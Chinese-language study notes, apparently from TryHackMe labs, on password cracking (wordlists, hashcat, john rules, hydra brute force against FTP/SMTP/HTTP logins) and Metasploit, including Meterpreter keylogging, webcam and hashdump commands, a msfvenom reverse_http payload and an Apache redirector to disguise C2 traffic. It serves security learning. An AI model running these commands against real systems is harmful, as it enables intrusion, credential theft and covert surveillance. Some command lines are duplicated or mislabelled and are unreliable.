<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 密码</span><br><span class="line"></span><br><span class="line">默认密码库</span><br><span class="line"></span><br><span class="line">- [https://cirt.net/密码](https://cirt.net/passwords)</span><br><span class="line">- https://default-password.info/</span><br><span class="line">- https://datarecovery.com/rd/default-passwords/</span><br><span class="line"></span><br><span class="line">弱密码库</span><br><span class="line"></span><br><span class="line">- [https://wiki.skullsecurity.org/index.php?title=密码](https://wiki.skullsecurity.org/index.php?title=Passwords) - 其中包括最著名的密码集合。</span><br><span class="line">- [SecLists——](https://github.com/danielmiessler/SecLists/tree/master/Passwords) 各种列表的巨大集合，不仅用于密码破解。</span><br><span class="line"></span><br><span class="line">泄露密码</span><br><span class="line"></span><br><span class="line">包括webhost、elitehacker、hak5、 Hotmail、 PhpBB等公司的泄露信息：</span><br><span class="line"></span><br><span class="line">- [安全列表/密码/泄露的数据库](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)</span><br><span class="line"></span><br><span class="line">处理</span><br><span class="line"></span><br><span class="line">- cat file1.txt file2.txt file3.txt &gt; combined_list.txt</span><br><span class="line">  - 合并单词表</span><br><span class="line">- sort combined_list.txt | uniq -u &gt; cleaned_combined_list.txt</span><br><span class="line">  - 去除重复单词</span><br><span class="line"></span><br><span class="line">### 密码工具</span><br><span class="line"></span><br><span class="line">#### Cewl</span><br><span class="line"></span><br><span class="line">可用于有效地抓取网站并提取字符串或关键字。Cewl是一款功能强大的工具，可生成特定于特定公司或目标的单词表。</span><br><span class="line"></span><br><span class="line">-  cewl -w list.txt -d 5 -m 5 http://thm.labs</span><br><span class="line"></span><br><span class="line">#### username_generator</span><br><span class="line"></span><br><span class="line">- git clone https://github.com/therodri2/username_generator.git</span><br><span class="line">- cd username_generator</span><br><span class="line">- python3 username_generator.py -h</span><br><span class="line"></span><br><span class="line">使用方法👇</span><br><span class="line"></span><br><span class="line">- echo &quot;John Smith&quot; &gt; users.lst </span><br><span class="line">- python3 username_generator.py -w users.lst</span><br><span class="line"></span><br><span class="line">#### crunch</span><br><span class="line"></span><br><span class="line">以下示例创建一个包含 2 个字符的所有可能组合的单词列表，包括 0-4 和 ad。 我们可以使用 -o参数并指定一个文件来保存输出</span><br><span class="line"></span><br><span class="line">- crunch 2 2 01234abcd -o crunch.txt</span><br><span class="line"></span><br><span class="line">什么是 crunch 命令来生成包含THM@%的列表 并输出到名为tryhackme.txt 的文件 ？</span><br><span class="line"></span><br><span class="line">- crunch 5 5 -t &quot;THM^^&quot; -o tryhackme.txt</span><br><span class="line"></span><br><span class="line">以 pass开头 并跟随着两个数字</span><br><span class="line"></span><br><span class="line">- crunch 6 6 -t pass%%</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>crunch 还允许我们使用 -t 选项指定字符集来组合我们选择的单词。以下是一些其他选项，可用于帮助创建您选择的不同组合：<br>@  - 小写字母<br>,  - 大写字母字符<br>%  - 数字字符<br>^  - 特殊字符，包括空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### CUPP</span><br><span class="line"></span><br><span class="line">Common User Passwords Profiler</span><br><span class="line"></span><br><span class="line">- python3 cupp.py -i</span><br><span class="line">  - 交互模式</span><br><span class="line">- python3 cupp.py -l</span><br><span class="line">  - 预先安装的单词表</span><br><span class="line">- python3 cupp.py -a</span><br><span class="line">  - 从alecto数据库中提取默认用户密码</span><br><span class="line"></span><br><span class="line">#### hashcat</span><br><span class="line"></span><br><span class="line">##### 识别hash类型</span><br><span class="line"></span><br><span class="line">hashid或 hash-identifier之类的工具</span><br><span class="line"></span><br><span class="line">##### 没字典</span><br><span class="line"></span><br><span class="line">/usr/share/wordlists/rockyou.txt: No such file or directory</span><br><span class="line"></span><br><span class="line">安装</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sudo apt-get update<br>sudo apt-get install wordlists<br>gzip -d &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-a 0 将攻击模式设置为字典攻击</span><br><span class="line"></span><br><span class="line">-m 0 设置破解 MD5 哈希的哈希模式；对于其他类型，运行hashcat -h获取受支持的哈希列表。</span><br><span class="line"></span><br><span class="line">-m 100  sha-1加密</span><br><span class="line"></span><br><span class="line">#### 暴力破解</span><br><span class="line"></span><br><span class="line">hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d</span><br><span class="line"></span><br><span class="line">-a 3 将攻击模式设置为暴力攻击</span><br><span class="line"></span><br><span class="line">?d?d?d?d ?d 告诉 hashcat 使用数字。在我们的例子中，?d?d?d?d 表示从 0000 开始到 9999 结束的四位数字</span><br><span class="line"></span><br><span class="line">--stdout将结果打印到终端 </span><br><span class="line"></span><br><span class="line">##### john-the-ripper</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>cat &#x2F;etc&#x2F;john&#x2F;john.conf|grep “List.Rules:” | cut -d”.” -f3 | cut -d”:” -f2 | cut -d”]” -f1 | awk NFcat &#x2F;etc&#x2F;john&#x2F;john.conf|grep “List.Rules:” | cut -d”.” -f3 | cut -d”:” -f2 | cut -d”]” -f1 | awk NF</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">--wordlist= 指定单词表或词典文件。 </span><br><span class="line"></span><br><span class="line">--rules 指定要使用哪条或哪几条规则。</span><br><span class="line"></span><br><span class="line">--stdout 将输出打印到终端。</span><br><span class="line"></span><br><span class="line">|wc -l 计算 John 写了多少行。</span><br><span class="line"></span><br><span class="line">- sudo vi /etc/john/john.conf </span><br><span class="line">  [List.Rules:THM-Password-Attacks] </span><br><span class="line">  Az&quot;[0-9]&quot; ^[!@#$]</span><br><span class="line"></span><br><span class="line">[List.Rules: THM -Password-Attacks] 指定规则名称THM -Password-Attacks。</span><br><span class="line"></span><br><span class="line">Az使用-p 表示来自原始单词列表/词典的单个单词。 </span><br><span class="line"></span><br><span class="line">“[0-9]”在单词末尾 附加一位数字（从 0到 9 ）。对于两位数字，我们可以添加“[0-9][0-9]” ，依此类推。  </span><br><span class="line"></span><br><span class="line">^[!@#$] 在每个单词的开头添加一个特殊字符。 ^ 表示行/单词的开头。注意，将 ^ 更改为 $会将特殊字符附加到行/单词的末尾。 </span><br><span class="line"></span><br><span class="line">###### 用规则输出密码</span><br><span class="line"></span><br><span class="line">john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout </span><br><span class="line"></span><br><span class="line">#### hydra</span><br><span class="line"></span><br><span class="line">##### 爆破ftp协议</span><br><span class="line"></span><br><span class="line">hydra -l ftp -P passlist.txt ftp://10.10.x.x</span><br><span class="line"></span><br><span class="line">##### 爆破smtp协议</span><br><span class="line"></span><br><span class="line">hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v</span><br><span class="line"></span><br><span class="line">例题</span><br><span class="line"></span><br><span class="line">- 先去john出规则密码</span><br><span class="line">  - sudo vi /etc/john/john.conf </span><br><span class="line">  - [List.Rules:thm1] </span><br><span class="line">  - Az&quot;[0–9][0–9]&quot; ^[!@]</span><br><span class="line">- 生成</span><br><span class="line">  -  john --wordlist=clinic.lst --rules=thm1 --stdout &gt; dict.lst </span><br><span class="line">- 爆破</span><br><span class="line">  - hydra -l pittman@clinic.thmredteam.com -P dict.lst smtp://10.10.74.70 -v</span><br><span class="line"></span><br><span class="line">##### 爆破ssh协议</span><br><span class="line"></span><br><span class="line">hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v</span><br><span class="line"></span><br><span class="line">- 题</span><br><span class="line">  - hydra -l pittman@clinic.thmredteam.com -P dict.lst smtp://10.10.74.70:465 -v -f</span><br><span class="line"></span><br><span class="line">##### 爆破html页面</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form “&#x2F;login-get&#x2F;index.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^:S&#x3D;logout.php” </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**-l admin** 我们指定单个用户名，使用-L 获取用户名单词表</span><br><span class="line"></span><br><span class="line">**-P Path** 指定单词表的完整路径，您可以 使用-p指定单个密码。 </span><br><span class="line"></span><br><span class="line">**10.10.xx** 目标的 IP 地址或完全限定域名 (FQDN)。</span><br><span class="line"></span><br><span class="line">**http-get-form HTTP** 请求的类型，可以是http-get-form或http-post-form 。  </span><br><span class="line"></span><br><span class="line">接下来，我们指定使用以下内容拆分的 URL、路径和条件： </span><br><span class="line"></span><br><span class="line">**login-get/index.php** 目标网络服务器上登录页面的路径。</span><br><span class="line"></span><br><span class="line">**username=^USER^&amp;password=^PASS^** 是暴力破解的参数，我们注入^USER^来暴力破解用户名，注入 ^PASS^ 来暴力破解指定字典中的密码。 </span><br><span class="line"></span><br><span class="line">以下部分对于通过使用F=指定“失败”条件来消除误报非常重要。 </span><br><span class="line"></span><br><span class="line">成功条件， S= 。 通过分析网页或在枚举阶段，您将获得有关这些条件的更多信息！ 您为这些值设置的内容取决于您从服务器收到的登录失败和登录成功尝试的响应。例如，如果您在登录失败后在网页上收到“密码无效”消息，请设置 F=密码无效。</span><br><span class="line"></span><br><span class="line">或者例如，在枚举过程中，我们发现 Web 服务器提供 logout.php服务。使用有效凭据登录登录页面后，我们可以猜测 logout.php 会在页面的某个位置。因此，我们可以告诉 hydra 在每个请求的 HTML 中查找文本 logout.php 。</span><br><span class="line"></span><br><span class="line">**S=logout.php 识别有效凭证的成功条件**</span><br><span class="line"></span><br><span class="line">**-f** 在找到有效的用户名和密码后停止暴力攻击</span><br><span class="line"></span><br><span class="line">## 枚举</span><br><span class="line"></span><br><span class="line">enumerate</span><br><span class="line"></span><br><span class="line">## metasploit</span><br><span class="line"></span><br><span class="line">开发文档</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html">https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">就是msfconsole位于以下目录</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>&#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### evasion逃逸模块</span><br><span class="line"></span><br><span class="line">绕过防病毒软件</span><br><span class="line"></span><br><span class="line">### Encoders编码</span><br><span class="line"></span><br><span class="line">对exploit和payload进行编码</span><br><span class="line"></span><br><span class="line">### Auxiliary辅助</span><br><span class="line"></span><br><span class="line">扫描仪、爬虫和模糊器</span><br><span class="line"></span><br><span class="line">### exploit漏洞库</span><br><span class="line"></span><br><span class="line">### payload</span><br><span class="line"></span><br><span class="line">在目标系统上运行的代码</span><br><span class="line"></span><br><span class="line">#### stagers</span><br><span class="line"></span><br><span class="line">msf与目标系统间建立联系，先上传一stager,再下载剩余的，</span><br><span class="line"></span><br><span class="line">#### singles</span><br><span class="line"></span><br><span class="line">自包含载荷，又称单一载荷</span><br><span class="line"></span><br><span class="line">### map邮票</span><br><span class="line"></span><br><span class="line">渗透测试过程的最后阶段，即后期开发中发挥作用</span><br><span class="line"></span><br><span class="line">### 基础命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>info<br>back<br>background<br>searh<br>use<br>unset #消除指定参数<br>unset all #全部参数清除<br>setg  #设置所有模块的值<br>exploit -z #扫漏洞并进入后台</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 端口扫描</span><br><span class="line"></span><br><span class="line">#### 一</span><br><span class="line"></span><br><span class="line">search portscan</span><br><span class="line"></span><br><span class="line">use</span><br><span class="line"></span><br><span class="line">set </span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">#### 二</span><br><span class="line"></span><br><span class="line">nmap</span><br><span class="line"></span><br><span class="line">nmap -Ss 10.10.10.221</span><br><span class="line"></span><br><span class="line">指定端口全面扫描nmap -A 10.10.10.221 -p 8000</span><br><span class="line"></span><br><span class="line">#### udp服务识别1</span><br><span class="line"></span><br><span class="line">scanner/discovery/udp_sweep模块</span><br><span class="line"></span><br><span class="line">#### smb扫描</span><br><span class="line"></span><br><span class="line">scanner/smb/smb_version模块和smb_enumshares模块</span><br><span class="line"></span><br><span class="line">##### msb登录爆破扫描</span><br><span class="line"></span><br><span class="line">use smb_login </span><br><span class="line"></span><br><span class="line">set passfile /usr/share/wordlists/thm/MetasploitWordlist.txt</span><br><span class="line"></span><br><span class="line">set smbuser </span><br><span class="line"></span><br><span class="line">set rhosts</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">### 数据库，针对多个目标</span><br><span class="line"></span><br><span class="line">systemctl start postgresql</span><br><span class="line"></span><br><span class="line">msfdb init</span><br><span class="line"></span><br><span class="line">在msf里看数据库状态db_status</span><br><span class="line"></span><br><span class="line">workspace #列出工作区</span><br><span class="line"></span><br><span class="line">workspace -a 或者-d 删除工作区</span><br><span class="line"></span><br><span class="line">-h 列出可用项</span><br><span class="line"></span><br><span class="line">db_nmap -sV -p- IP  #会将所有结果写入数据库中</span><br><span class="line"></span><br><span class="line">然后hosts，services会列出所有和目标系统上服务和相关信息</span><br><span class="line"></span><br><span class="line">### 漏扫</span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/vnc/</span><br><span class="line"></span><br><span class="line">### 进程</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>getpid 查看msf的pid </p>
<p>ps 看到的是spoolsv.exe</p>
<p>tasklist &#x2F;m &#x2F;fi “pid eq 1304”<br>查看 Meterpreter 进程（本例中为PID 1304）使用的 DLL（动态链接库），我们仍然找不到任何东西（例如没有 meterpreter.dll）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 其他设备</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>msfvenom –list payloads | grep meterpreter</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- Android</span><br><span class="line">- Apple iOS</span><br><span class="line">- Java</span><br><span class="line">- Linux</span><br><span class="line">- OSX</span><br><span class="line">- PHP</span><br><span class="line">- Python</span><br><span class="line">- Windows</span><br><span class="line"></span><br><span class="line">### 其他骚操作</span><br><span class="line"></span><br><span class="line">如果您运行该 `help` 命令，您将看到 Meterpreter命令列在不同的类别下。</span><br><span class="line"></span><br><span class="line">- 核心命令</span><br><span class="line">- 文件系统命令</span><br><span class="line">- 网络命令</span><br><span class="line">- 系统命令</span><br><span class="line">- 用户界面命令</span><br><span class="line">- 网络摄像头命令</span><br><span class="line">- 音频输出命令</span><br><span class="line">- 提升命令</span><br><span class="line">- 密码数据库命令</span><br><span class="line">- Timestomp 命令</span><br><span class="line"></span><br><span class="line">#### 核心命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- `background`：当前会话的背景</span><br><span class="line">- `exit`：终止Meterpreter会话</span><br><span class="line">- `guid`：获取会话 GUID（全局唯一标识符）</span><br><span class="line">- `help`：显示帮助菜单</span><br><span class="line">- `info`：显示有关 Post 模块的信息</span><br><span class="line">- `irb`：在当前会话中打开交互式 Ruby shell</span><br><span class="line">- `load`：加载一个或多个Meterpreter扩展</span><br><span class="line">- `migrate`：允许您将Meterpreter迁移到另一个进程</span><br><span class="line">- `run`：执行Meterpreter脚本或 Post 模块</span><br><span class="line">- `sessions`：快速切换到另一个会话</span><br><span class="line"></span><br><span class="line">#### 文件系统命令</span><br><span class="line"></span><br><span class="line">- `cd`：将更改目录</span><br><span class="line">- `ls`：将列出当前目录中的文件（dir 也可以）</span><br><span class="line">- `pwd`：打印当前工作目录</span><br><span class="line">- `edit`：将允许您编辑文件</span><br><span class="line">- `cat`：将在屏幕上显示文件的内容</span><br><span class="line">- `rm`：将删除指定文件</span><br><span class="line">- `search`：将搜索文件</span><br><span class="line">- `upload`：将上传文件或目录</span><br><span class="line">- `download`：将下载文件或目录</span><br><span class="line"></span><br><span class="line">#### 网络命令</span><br><span class="line"></span><br><span class="line">- `arp`：显示主机ARP（地址解析协议）缓存</span><br><span class="line">- `ifconfig`：显示目标系统上可用的网络接口</span><br><span class="line">- `netstat`：显示网络连接</span><br><span class="line">- `portfwd`：将本地端口转发到远程服务</span><br><span class="line">- `route`：允许您查看和修改路由表</span><br><span class="line"></span><br><span class="line">#### 系统命令</span><br><span class="line"></span><br><span class="line">- `clearev`：清除事件日志</span><br><span class="line">- `execute`：执行命令</span><br><span class="line">- `getpid`：显示当前进程标识符</span><br><span class="line">- `getuid`：向用户显示Meterpreter正在以以下身份运行</span><br><span class="line">- `kill`：终止进程</span><br><span class="line">- `pkill`：通过名称终止进程</span><br><span class="line">- `ps`：列出正在运行的进程</span><br><span class="line">- `reboot`：重新启动远程计算机</span><br><span class="line">- `shell`：进入系统命令 shell</span><br><span class="line">- `shutdown`：关闭远程计算机</span><br><span class="line">- `sysinfo`：获取有关远程系统的信息，例如操作系统</span><br><span class="line"></span><br><span class="line">#### 其他命令</span><br><span class="line"></span><br><span class="line">（这些命令将在帮助菜单中的不同菜单类别下列出）</span><br><span class="line"></span><br><span class="line">- `idletime`：返回远程用户空闲的秒数</span><br><span class="line">- `keyscan_dump`：转储击键缓冲区</span><br><span class="line">- `keyscan_start`：开始捕获击键</span><br><span class="line">- `keyscan_stop`：停止捕获按键</span><br><span class="line">- `screenshare`：允许您实时观看远程用户的桌面</span><br><span class="line">- `screenshot`：抓取交互式桌面的屏幕截图</span><br><span class="line">- `record_mic`：从默认麦克风录制 X 秒的音频</span><br><span class="line">- `webcam_chat`：开始视频聊天</span><br><span class="line">- `webcam_list`：列出网络摄像头</span><br><span class="line">- `webcam_snap`：从指定的网络摄像头拍摄快照</span><br><span class="line">- `webcam_stream`：播放指定网络摄像头的视频流</span><br><span class="line">- `getsystem`：尝试将您的权限提升至本地系统权限</span><br><span class="line">- `hashdump`：转储 SAM 数据库的内容</span><br><span class="line"></span><br><span class="line">### 高级设置</span><br><span class="line"></span><br><span class="line">这边有时间重新学一下，能有一定程度的绕过流量检测</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://tryhackme.com/r/room/introtoc2">https://tryhackme.com/r/room/introtoc2</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 生成修改标头后的有效负载</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http LHOST&#x3D;tun0 LPORT&#x3D;80 HttpUserAgent&#x3D;NotMeterpreter -f exe -o shell.exe</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 修改apache文件</span><br><span class="line"></span><br><span class="line">改的是靶机的</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>位置&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf</p>
<p>cat &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf  | grep -v ‘#’</p>
<p>内容<br>&lt;VirtualHost *:80&gt;</p>
<pre><code>    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    &lt;Directory&gt;
            AllowOverride All
    &lt;/Directory&gt;

    ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log
    CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined
</code></pre>
</VirtualHost>
修改为
<VirtualHost *:80>

<pre><code>ServerAdmin webmaster@localhost
DocumentRoot /var/www/html

RewriteEngine On
RewriteCond %&#123;HTTP_USER_AGENT&#125; &quot;^NotMeterpreter$&quot;
ProxyPass &quot;/&quot; &quot;http://localhost:8080/&quot;

&lt;Directory&gt;
    AllowOverride All
&lt;/Directory&gt;

ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log
CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined
</code></pre>
</VirtualHost>
